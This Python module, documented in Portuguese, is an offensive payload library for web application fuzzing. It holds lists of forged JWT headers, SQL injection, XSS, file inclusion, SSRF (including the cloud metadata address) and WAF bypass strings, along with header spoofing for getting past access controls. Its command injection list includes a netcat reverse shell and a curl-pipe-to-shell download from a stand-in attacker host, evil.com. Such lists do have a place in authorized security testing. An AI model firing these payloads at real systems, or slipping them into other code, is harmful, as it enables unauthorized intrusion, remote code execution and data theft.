"""
Payloads avançados e dinâmicos para fuzzing, bypass, JWT, SQLi, XSS, LFI, RCE, SSRF e outros vetores.
"""

import uuid
import base64
import random

def random_string(length=8):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    return ''.join(random.choice(chars) for _ in range(length))

def random_uuid():
    return str(uuid.uuid4())

def encode_base64(data):
    return base64.b64encode(data.encode()).decode()

# Payloads JWT
JWT_PAYLOADS = [
    {"alg": "none", "typ": "JWT"},
    {"alg": "HS256", "typ": "JWT"},
    {"alg": "RS256", "typ": "JWT"},
    {"alg": "ES256", "typ": "JWT"},
    {"alg": "HS256", "kid": "../../../../dev/null", "typ": "JWT"},
    {"alg": "HS256", "kid": "file:///etc/passwd", "typ": "JWT"},
    {"alg": "HS256", "kid": "http://localhost:8000/.env", "typ": "JWT"},
    {"alg": "HS256", "kid": "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA", "typ": "JWT"},
    {"alg": "HS256", "jku": "http://evil.com/jwks.json", "typ": "JWT"},
    {"alg": "HS256", "x5u": "http://evil.com/cert.pem", "typ": "JWT"},
]

# SQL Injection avançado
SQLI_PAYLOADS = [
    "' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
    "' UNION SELECT NULL, version(), user(), database()--",
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10--",
    "' AND 1=CONVERT(int,@@version)--",
    "' AND updatexml(1,concat(0x7e,(SELECT user())),0)--",
    "' AND extractvalue(1,concat(0x7e,(SELECT database())))--",
    "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
]

# XSS avançado
XSS_PAYLOADS = [
    "<script>alert(1337)</script>",
    "\"><svg/onload=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<img src=x onerror=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<math href='javascript:prompt(1)'>CLICK</math>",
    "<svg><script>confirm(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<object data='javascript:alert(1)'>",
]

# LFI/RFI
LFI_PAYLOADS = [
    "../../etc/passwd",
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=index.php",
    "expect://id",
    "file:///etc/passwd",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

# RCE
RCE_PAYLOADS = [
    "|| id",
    "| whoami",
    "; uname -a",
    "`cat /etc/passwd`",
    "$(id)",
    "& ping -c 4 evil.com &",
    "127.0.0.1; nc -e /bin/sh evil.com 4444",
    "1; curl http://evil.com/shell.sh | sh",
]

# SSRF
SSRF_PAYLOADS = [
    "http://127.0.0.1:80/",
    "http://localhost:80/",
    "http://169.254.169.254/latest/meta-data/",
    "http://[::1]/",
    "http://evil.com@127.0.0.1/",
    "http://127.0.0.1:80/admin",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_PING",
]

# Bypass de WAF e filtros
BYPASS_PAYLOADS = [
    "/..;/admin",
    "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "/%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/admin%20/",
    "/admin%09/",
    "/admin%00/",
    "/admin/.%00/",
    "/admin;.css",
    "/admin.json",
]

# Headers dinâmicos para fuzzing
def dynamic_headers(jwt_token=None, api_key=None):
    headers = {
        "User-Agent": f"EVIL_JWT_FORCE-FUZZ/{random.randint(100,999)}",
        "X-Request-ID": random_uuid(),
        "X-Api-Version": f"v{random.randint(1,3)}",
        "X-Fuzz": random_string(6),
        "X-Forwarded-For": f"127.0.0.{random.randint(1,254)}",
        "X-Client-IP": f"10.0.0.{random.randint(1,254)}",
        "X-Host": "localhost",
        "X-Forwarded-Host": "localhost",
        "X-Original-URL": "/admin",
        "X-Rewrite-URL": "/admin",
        "Cache-Control": "no-cache",
        "Pragma": "no-cache"
    }
    if jwt_token:
        headers["Authorization"] = f"Bearer {jwt_token}"
    if api_key:
        headers["X-API-KEY"] = api_key
    return headers

# Dicionário principal de payloads
PAYLOADS = {
    "jwt": JWT_PAYLOADS,
    "sqli": SQLI_PAYLOADS,
    "xss": XSS_PAYLOADS,
    "lfi": LFI_PAYLOADS,
    "rce": RCE_PAYLOADS,
    "ssrf": SSRF_PAYLOADS,
    "bypass": BYPASS_PAYLOADS,
    "dynamic_headers": dynamic_headers
}